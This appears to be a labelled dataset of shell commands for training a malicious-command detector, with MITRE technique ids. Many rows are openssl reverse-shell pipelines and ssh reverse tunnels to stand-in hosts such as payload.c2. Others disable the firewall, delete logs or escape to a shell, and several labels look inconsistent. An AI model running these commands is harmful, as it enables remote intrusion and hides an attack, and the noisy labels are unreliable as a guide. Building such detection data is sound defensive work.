command,label,original_label,mitre_id
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
gcalcli --calendar calendar_name agenda,Benign,Benign,Benign
ssh -R 4444:localhost:22 audit@update.bad,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
nix help subcommand,Benign,Benign,Benign
systemctl enable $systemd_timer_name,Malicious,Malicious,T1053
upnpc -d 80 tcp,Benign,Benign,Benign
"find $DIR -name ""*.txt""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ctop -r,Benign,Benign,Benign
ssh -R 4444:localhost:995 jenkins@10.0.0.10,Context_Dependent,Synthetic,Synthetic
kaggle [d|datasets] create [-p|--path] path/to/dataset [-u|--public],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
cd $(find . -name config -type d | sed 1q),Benign,Benign,Benign
tldr set-nodeversion,Benign,Benign,Benign
find . -mtime +1,Benign,Benign,Benign
bun [i|install] [-p|--production],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
github-label-sync --access-token token --dry-run repository_name,Benign,Benign,Benign
snakefmt --diff path/to/snakefile,Benign,Benign,Benign
bleachbit_console.exe --shred path\to\file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3306,Malicious,Synthetic,Synthetic
npm unstar package_name --auth-type legacy|oauth|web|saml,Benign,Benign,Benign
ssh -R 4444:localhost:3306 user@172.16.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
pkgutil --files com.microsoft.Word,Benign,Benign,Benign
user: x,Malicious,Malicious,T1059
jj parallelize revsets,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
steamcmd +runscript script.txt,Benign,Benign,Benign
find ./ -name *.ogv -exec echo myfile {} \;,Benign,Benign,Benign
vi -c ':!/bin/sh' /dev/null,Malicious,Malicious,T1059
ssh -L 8080:localhost:80 postgres@10.0.0.10,Context_Dependent,Synthetic,Synthetic
tye deploy,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
find /etc -newer /etc/motd,Benign,Benign,Benign
mkosi qemu,Benign,Benign,Benign
ssh -R 8080:localhost:9090 postgres@malware.site,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
shopt -s expand_aliases,Benign,Benign,Benign
ng add package --skip-confirmation,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
udiskie-mount --verbose /dev/sdX1,Benign,Benign,Benign
kubectl get all,Context_Dependent,Benign,Benign
dwebp path/to/input.webp -bmp|-tiff|-pam|-ppm|-pgm|-yuv -o path/to/output,Benign,Benign,Benign
elasticsearch-node [-h|--help],Benign,Benign,Benign
jrnl,Benign,Benign,Benign
unlink /var/log/messages,Malicious,Malicious,T1070
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
sudo make /tmp/hello,Malicious,Malicious,T1548
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
free -b|k|m|g,Benign,Benign,Benign
"minio server --address "":port"" --console-address "":port"" path/to/data_directory",Benign,Benign,Benign
lesskey [-V|--version],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
resticprofile --dry-run backup,Benign,Benign,Benign
ssh -L 8080:localhost:80 deploy@172.16.5.20,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:995 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
"find -x data -name ""filepattern-*2009*"" -print0 > filesOfInterest.txt",Benign,Benign,Benign
appman [-s|sync],Benign,Benign,Benign
airport sniff 1,Benign,Benign,Benign
ssh -R 8080:localhost:80 backup@files.company.local,Context_Dependent,Synthetic,Synthetic
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs,Context_Dependent,Malicious,T1082
ssh -R 4444:localhost:9001 postgres@example.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
sha384sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
dumpsys,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:3306,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:80 jenkins@support.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
comm -1 -2 file1.sorted file2.sorted,Benign,Benign,Benign
ar t path/to/file.ar,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
cdparanoia [-Q|--query],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
"ssh askapache 'nice -n 19 sh -c ""( ( nohup chown -R ask:ask /www/askapache.com &>/dev/null ) & )""'",Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
mkdir aaa/bbb,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
find / -mtime +50 -mtime -100,Context_Dependent,Benign,Benign
find . -name '*.java' -exec grep REGEX {} \;,Benign,Benign,Benign
keybase encrypt [-i|--infile] input_file [-o|--outfile] output_file receiver,Benign,Benign,Benign
ssh -L 8080:localhost:993 support@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
Visio.exe {REMOTEURL},Malicious,Malicious,T1105
"echo hello world | tee >(awk '{print $2, $1}')",Benign,Benign,Benign
trayer --width 10 --height 32,Benign,Benign,Benign
"find /dir/to/search/ -name "".*"" -ls",Benign,Benign,Benign
find -type f -maxdepth 1 -writable,Benign,Benign,Benign
"magick identify -format ""%f,%w,%h\n"" *.jpg > path/to/filelist.csv",Benign,Benign,Benign
"echo `echo ""Ho ho ho""` | od -c",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
afinfo --xml path/to/file,Benign,Benign,Benign
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",Malicious,Malicious,T1218
find . -maxdepth 1 -type d -empty -exec rm {} \;,Benign,Benign,Benign
sattach --input-filter task_number,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
rsync -rvv --recursive /path/to/data/myappdata user@host:/remote/path/to/data/newdirname,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
pnmtorle [-a|-alpha] path/to/input.pnm > path/to/output.rle,Benign,Benign,Benign
ssh -R 8080:localhost:445 svcuser@192.168.1.25,Context_Dependent,Synthetic,Synthetic
npm hook ls,Benign,Benign,Benign
docker [update|container update] [-m|--memory] limitM container_name,Benign,Benign,Benign
systemctl stop ufw,Malicious,Malicious,T1562
emacsclient path/to/file,Benign,Benign,Benign
jp2a --output=path/to/output_file.txt path/to/image.jpeg,Benign,Benign,Benign
pacconf --version,Benign,Benign,Benign
ssh -R 4444:localhost:993 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
ls -d -1 $PWD/**/*,Benign,Benign,Benign
chown user destination_dir,Benign,Benign,Benign
MQTT,Malicious,Malicious,T1071
openssl s_client -quiet -connect 192.168.0.5:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
doctl [d|databases] db [rm|delete] database_id database_name,Benign,Benign,Benign
aspell --lang cs,Benign,Benign,Benign
pamtowinicon [-t|-truetransparent] path/to/input_file.pam > path/to/output.ico,Benign,Benign,Benign
"find /res/values-en-rUS /res/xml -iname '*.xml' | while read file; do grep -i ""hovering_msg"" ""$file""; done",Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
echo $(($(date +%s) / 60 / 60 / 24)),Benign,Benign,Benign
msfvenom [-l|--list] payloads,Benign,Benign,Benign
ssh -R 8080:localhost:80 jenkins@example.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
find . -type f -mtime -14 > deploy.txt,Benign,Benign,Benign
ssh -R 4444:localhost:443 deploy@10.10.10.10,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:445 support@192.168.0.50,Context_Dependent,Synthetic,Synthetic
find . -iregex '.*/.git/.*' -prune -o -type d -name 'CVS',Benign,Benign,Benign
k8sec dump [-f|--filename] path/to/file secret_name,Benign,Benign,Benign
ilbmtoppm [-ig|-ignore] chunkID path/to/file.ilbm > path/to/file.ppm,Benign,Benign,Benign
find . type -f -amin -2,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
"Set-Service -Name service_name -Description ""description""",Benign,Benign,Benign
"$wc.DownloadFile($url, $imgLocation)",Malicious,Malicious,T1491
GetProcessHeap,Malicious,Malicious,T1106
ssh -R 4444:localhost:9090 root@payload.c2,Context_Dependent,Synthetic,Synthetic
sniffer.py protocol1 protocol2 ...,Benign,Benign,Benign
ssh -R 8080:localhost:80 postgres@10.0.0.50,Context_Dependent,Synthetic,Synthetic
sudo cp $path_malicious_plist /tmp/T1037_005_daemon.plist,Malicious,Malicious,T1037
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
"Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME",Malicious,Malicious,T1098
ssh -L 8080:localhost:80 operator@files.company.local,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:8080 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
fwupdmgr refresh,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
blackfire --samples 10 run php path/to/file.php,Benign,Benign,Benign
markdown2pdf [-p|--path] path/to/input_file.md,Benign,Benign,Benign
Actual: $ActualOutput,Malicious,Malicious,T1218
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
%USERPROFILE%\Recent,Context_Dependent,Malicious,T1083
ssh -R 4444:localhost:22 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
path=$(basename $path),Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:110 admin@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
aws lambda get-policy --function-name name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
find . -type f -mtime -14 | cut -b 3- > deploy.txt,Benign,Benign,Benign
ip [st|stats] show group link,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
rspamc learn_ham path/to/email_file,Benign,Benign,Benign
flash -i,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
umount mountpoint,Benign,Benign,Benign
ssh -R 8080:localhost:110 operator@update.bad,Context_Dependent,Synthetic,Synthetic
find path/to/directory -type d -iname '*lib*',Benign,Benign,Benign
ssh -R 8080:localhost:9001 operator@192.168.0.5,Context_Dependent,Synthetic,Synthetic
"find ./ -name ""blabla"" -exec wc -l {} ;",Benign,Benign,Benign
dzdo -v,Benign,Benign,Benign
"speak-ng -v voice ""text""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
tlmgr restore,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
paccapability nls|downloader|signatures,Benign,Benign,Benign
xctool -workspace YourWorkspace.xcworkspace -scheme YourScheme build,Benign,Benign,Benign
freeze path/to/file [-o|--output] path/to/output_image.png,Benign,Benign,Benign
ghc path/to/file.hs,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
neofetch --enable|disable infoname,Benign,Benign,Benign
"echo ""$a"" | awk '{print tolower($0)}'",Benign,Benign,Benign
mcs -target:exe|winexe|library|module path/to/input_file1.cs path/to/input_file2.cs ...,Benign,Benign,Benign
typst --font-path path/to/fonts_directory fonts,Benign,Benign,Benign
find $dir -maxdepth 1 -type d -user $username -perm -100,Benign,Benign,Benign
jj new [-B|--insert-before] revsets [-A|--insert-after] revsets,Benign,Benign,Benign
ddgr keyword filetype:filetype,Benign,Benign,Benign
Get-Help command -Parameter parameter,Benign,Benign,Benign
jj git init --git-repo git_repo,Benign,Benign,Benign
generaldomaininfo -noninteractive -consoleoutput,Context_Dependent,Malicious,T1087
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
eglinfo -B,Benign,Benign,Benign
"git commit [-m|--message] ""message"" [-m|--message] ""description""",Benign,Benign,Benign
mount /dev/sda1 /mnt/,Malicious,Malicious,T1059
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
"kill -HUP $(ps -A -ostat,ppid | grep -e '[zZ]'| awk '{ print $2 }')",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
talk username tty3,Benign,Benign,Benign
find . -amin -1,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
terraform show path/to/file.tfplan,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
ipset save set_name > path/to/ip_set,Benign,Benign,Benign
i3exit suspend,Benign,Benign,Benign
"az cognitiveservices account commitment-plan create [-n|--name] account_name [-g|--resource-group] resource_group --commitment-plan-name ""plan_name"" --hosting-model ""hosting_model"" --plan-type ""plan_type"" --auto-renew false|true",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
comm abc def,Benign,Benign,Benign
gcloud container clusters describe cluster_name,Benign,Benign,Benign
troff path/to/input.roff | grops > path/to/output.ps,Benign,Benign,Benign
cd $test_folder; touch a b c d e f g,Malicious,Malicious,T1560
handbrakecli [-i|--input] input.mp4 [-o|--output] output.mp4 [-w|--width] 320 [-l|--height] 240,Benign,Benign,Benign
ssh -R 4444:localhost:8080 root@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:9090 svcuser@10.10.10.10,Context_Dependent,Synthetic,Synthetic
pnmhisteq [-g|-grey] path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
mpv --sub-file=path/to/file,Benign,Benign,Benign
ssh -R 4444:localhost:6379 user@10.0.0.50,Context_Dependent,Synthetic,Synthetic
i3-scrot --window 5,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:22 root@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
clangd --help,Benign,Benign,Benign
oc get pods,Benign,Benign,Benign
aiac get mongo query that aggregates all documents by created date,Benign,Benign,Benign
ldapsearch [-D|--bindDN] 'admin_DN' [-w|--bindPassword] 'password' [-h|--hostname] ldap_host '(|(memberOf=group1)(memberOf=group1)(memberOf=group3))' displayName,Benign,Benign,Benign
gpgconf --list-components,Benign,Benign,Benign
apptainer registry logout docker://registry,Benign,Benign,Benign
